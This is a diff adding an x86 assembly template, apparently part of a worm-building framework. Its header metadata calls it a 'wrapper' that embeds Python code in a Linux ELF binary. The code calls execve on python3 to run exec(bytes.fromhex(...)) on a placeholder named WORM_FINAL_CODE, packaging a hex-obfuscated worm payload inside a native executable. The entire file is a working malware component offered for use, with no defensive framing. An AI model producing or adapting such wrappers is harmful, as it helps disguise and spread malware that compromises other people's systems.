@@ -1,0 +1,26 @@
+#!name##Nasmix
+#!types##wrapper
+#!info##Put python code in assembler binnary (linux) to spawn /bin/bash python3 script
+#!lang##asm
+#!globalVar##OS_EXEC##linux##Target system executable
+#!globalVar##COMPILER_NAME##MC_elf32##Compiler name
+#!system_FLAG##[L]
+
+section .data
+    arg0    db "/usr/bin/python3",0
+    arg1    db "-c",0
+    script db "exec(bytes.fromhex('{{WORM_FINAL_CODE}}'))",0
+
+    align 4
+    argv    dd arg0, arg1, script, 0
+    envp    dd 0
+
+section .text
+global _start
+
+_start: 
+    mov eax, 11
+    mov ebx, arg0
+    mov ecx, argv
+    mov edx, envp
+    int 0x80
